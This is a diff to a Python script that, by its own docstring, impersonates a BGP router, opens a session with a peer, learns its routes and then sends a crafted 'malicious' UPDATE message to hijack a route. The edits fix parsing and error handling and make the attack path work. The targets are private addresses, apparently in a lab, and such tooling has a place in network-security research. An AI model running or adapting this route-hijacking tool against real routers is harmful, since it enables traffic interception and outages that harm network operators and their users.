@@ -3,7 +3,7 @@ Mimics a BGP router establishing a BGP session with a peer, doing the appropriat
 It then builds a BGP UPDATE message to hijack a route and sends it to the peer.
 """
 from transport import TCPTransportClient
-from custom_python_scripts.bgp_messages import BGPUpdate, BGPNotification, BGPKeepAlive, BGPOpen, parse_bytes
+from bgp_messages import BGPUpdate, BGPNotification, BGPKeepAlive, BGPOpen, parse_bytes
 from fields import IntField, StringField, ListField, LengthField, Field, MetaField
 from bgp_fields import (
     IPv4AddressField,
@@ -49,6 +49,11 @@ COMMON_CAPABILITIES = [
     GracefulRestart(False, True, 120),
     LongLivedGracefulRestart(0x00010180000000),
 ]
+
+
+def verify_message_type(message: BGPNotification | BGPOpen | BGPKeepAlive | BGPUpdate, expected_type) -> None:
+    if not isinstance(message, expected_type):
+        raise ValueError(f'Expected `{expected_type.__name__}` message. Instead received a `{message.__class__.__name__}` message.\nRaw Message: {message.to_bytes()}\nParsed Message: {message}')
 
 
 class BGPSessionInfo:
@@ -130,7 +135,7 @@ class BGPPeer:
         return hash((self.ip_address, self.asn))
 
     def create_open(self) -> BGPOpen:
-        open_message = BGPOpen(self.version, self.ip_address, self.asn, self.hold_time)
+        open_message = BGPOpen(self.bgp_version, self.ip_address, self.asn, self.hold_time)
         open_message.optional_parameters.extend(self.opt_param_capabilities)
         return open_message
 
@@ -184,10 +189,6 @@ class BGPPeer:
             updates.append(self.create_update(session, route_info))
         return updates
 
-    def __verify_message_type(self, message: BGPNotification | BGPOpen | BGPKeepAlive | BGPUpdate, expected_type) -> None:
-        if not isinstance(message, expected_type):
-            raise ValueError(f'Expected `{expected_type.__name__}` message. Instead received a `{message.__class__.__name__}` message.\nRaw Message: {message.to_bytes()}\nParsed Message: {message}')
-
     def connect(self, remote_ip: str, local_address: str = None, local_port: int = None) -> 'BGPSession':
         '''
         Attempts to establish a BGP session with the given remote IP address.
@@ -202,28 +203,28 @@ class BGPPeer:
         session_transport.connect(remote_ip, 179, local_address, local_port)
 
         # Exchange BGPOpen messages
-        peer_msg1_bytes = session_transport.sendrecv(self.create_open())
-        parsed_msg1 = next(parse_bytes(peer_msg1_bytes))
-        self.__verify_message_type(parsed_msg1, BGPOpen)
+        peer_msg1_bytes = session_transport.sendrecv(self.create_open().to_bytes())
+        parsed_msg1 = parse_bytes(peer_msg1_bytes)[0]
+        verify_message_type(parsed_msg1, BGPOpen)
         peer_open_msg: BGPOpen = parsed_msg1
 
         # Parse open message to establish session and peer object
-        peer_marker = peer_open_msg.header.marker
-        peer_hold_time = peer_open_msg.hold_time
-        peer_ip = peer_open_msg.bgp_id
-        peer_asn = peer_open_msg.my_as
-        has_four_byte_asn = any(isinstance(opt_param.capability, FourOctetASNumber) for opt_param in peer_open_msg.optional_parameters)
+        peer_marker = peer_open_msg.header.marker.value
+        peer_hold_time = peer_open_msg.hold_time.value
+        peer_ip = peer_open_msg.bgp_id.value
+        peer_asn = peer_open_msg.my_as.value
+        has_four_byte_asn = any(isinstance(opt_param.capability, FourOctetASNumber) for opt_param in peer_open_msg.optional_parameters.value)
         if has_four_byte_asn:
-            peer_asn = next(opt_param.capability.asn for opt_param in peer_open_msg.optional_parameters if isinstance(opt_param.capability, FourOctetASNumber)).value
-        peer_has_software_version = any(isinstance(opt_param.capability, SoftwareVersion) for opt_param in peer_open_msg.optional_parameters)
+            peer_asn = next(opt_param.capability.asn for opt_param in peer_open_msg.optional_parameters.value if isinstance(opt_param.capability, FourOctetASNumber)).value
+        peer_has_software_version = any(isinstance(opt_param.capability, SoftwareVersion) for opt_param in peer_open_msg.optional_parameters.value)
         peer_software_version = None
         if peer_has_software_version:
-            peer_software_version = next(opt_param.capability.version for opt_param in peer_open_msg.optional_parameters if isinstance(opt_param.capability, SoftwareVersion))
-        peer_has_fqdn = any(isinstance(opt_param.capability, FQDN) for opt_param in peer_open_msg.optional_parameters)
+            peer_software_version = next(opt_param.capability.software_version.value for opt_param in peer_open_msg.optional_parameters.value if isinstance(opt_param.capability, SoftwareVersion))
+        peer_has_fqdn = any(isinstance(opt_param.capability, FQDN) for opt_param in peer_open_msg.optional_parameters.value)
         peer_hostname = None
         peer_domain_name = None
         if peer_has_fqdn:
-            fqdn = next(opt_param.capability for opt_param in peer_open_msg.optional_parameters if isinstance(opt_param.capability, FQDN))
+            fqdn = next(opt_param.capability for opt_param in peer_open_msg.optional_parameters.value if isinstance(opt_param.capability, FQDN))
             peer_hostname = fqdn.hostname
             peer_domain_name = fqdn.domain_name
 
@@ -231,26 +232,31 @@ class BGPPeer:
         bgp_session = BGPSession(session_transport, self, bgp_peer, marker=peer_marker)
 
         # Exchange BGPKeepAlive messages
-        parsed_msg2 = next(bgp_session.recv())
-        self.__verify_message_type(parsed_msg2, BGPKeepAlive)
+        parsed_msg2 = bgp_session.recv()[0]
+        verify_message_type(parsed_msg2, BGPKeepAlive)
         bgp_session.send(self.create_keepalive())
 
         # Exchange BGPUpdate messages
-        update_messages: list[BGPUpdate] = self.create_updates()
+        update_messages: list[BGPUpdate] = self.create_updates(bgp_session)
         parsed_msg3 = bgp_session.sendrecv(update_messages)
         for msg in parsed_msg3:
-            self.__verify_message_type(msg, BGPUpdate)
+            verify_message_type(msg, BGPUpdate)
 
         peer_update_msgs: BGPUpdate = parsed_msg3
 
         # Parse update messages to determine peer routes
-        for update_msgs in peer_update_msgs:
+        for update_msg in peer_update_msgs:
             route_info = BGPRouteInfo()
-            for attr in update_msgs.path_attributes:
+            if update_msg.nlri is None:
+                continue
+
+            route_info.network_address = update_msg.nlri.address.value
+            route_info.network_prefix = update_msg.nlri.prefix_length.value
+            for attr in update_msg.path_attributes.value:
                 if isinstance(attr, Origin):
                     route_info.origin = attr.origin
                 elif isinstance(attr, ASPath):
-                    route_info.as_path = attr.asns
+                    route_info.as_path = [asn.value for asn in attr.asns.value]
                 elif isinstance(attr, NextHop):
                     route_info.next_hop = attr.next_hop
                 elif isinstance(attr, MultiExitDisc):
@@ -260,8 +266,8 @@ class BGPPeer:
             bgp_session.bgp_peer.routes.append(route_info)
 
         # Exchange BGPKeepAlive messages again
-        parsed_msg4 = next(bgp_session.recv())
-        self.__verify_message_type(parsed_msg4, BGPKeepAlive)
+        parsed_msg4 = bgp_session.recv()[0]
+        verify_message_type(parsed_msg4, BGPKeepAlive)
         bgp_session.send(self.create_keepalive())
 
         self.sessions.append(bgp_session)
@@ -334,6 +340,7 @@ class BGPSession:
 
 
 def main():
+    bgp_session = None
     try:
         # Create local BGP instance
         local_address = '192.168.0.1'
@@ -344,7 +351,7 @@ def main():
         local_software_version = 'FRRouting/10.1.1'
         local_peer = BGPPeer(local_hostname, local_domain_name, local_software_version, local_address, local_asn, local_hold_time)
 
-        # Connect establish BGP session with remote BGP peer
+        # Connect and establish BGP session with remote BGP peer
         remote_peer_address = '192.168.0.254'
         print(f'Connecting to remote BGP peer at {remote_peer_address} and establishing BGP session...', end=' ', flush=True)
         bgp_session = local_peer.connect(remote_peer_address)
@@ -353,7 +360,8 @@ def main():
         # Print routes learned from peer
         print(f'Routes learned from peer {bgp_session.bgp_peer.ip_address} with ASN {bgp_session.bgp_peer.asn}:')
         for route in bgp_session.bgp_peer.routes:
-            print(f'\t{route.network_address}/{route.network_prefix} via {route.next_hop} with AS Path {route.as_path}')
+            print(f'\t{route.network_address}/{route.network_prefix} via {route.next_hop.value} with AS Path {route.as_path}')
+        print()
 
         # Give time for BGP session to establish and a few keepalives to be exchanged
         sleep(16)
@@ -370,8 +378,11 @@ def main():
         # Send malicious BGP Update message to peer
         malicious_bgp_update_message = local_peer.create_update(bgp_session, route_info)
         remote_peer_response = bgp_session.sendrecv(malicious_bgp_update_message)
+        for msg in remote_peer_response:
+            if isinstance(msg, BGPNotification):
+                raise IOError(f"BGP Peer responded with a BGP Notification error message.\n{msg}")
+
         print(f'Malicious BGP Update message sent to peer {bgp_session.bgp_peer.ip_address} with ASN {bgp_session.bgp_peer.asn}.')
-        print(f'Remote peer response:\n{remote_peer_response}')
         print('Main thread going to sleep for a while...')
         sleep(3600)
     except Exception as e:
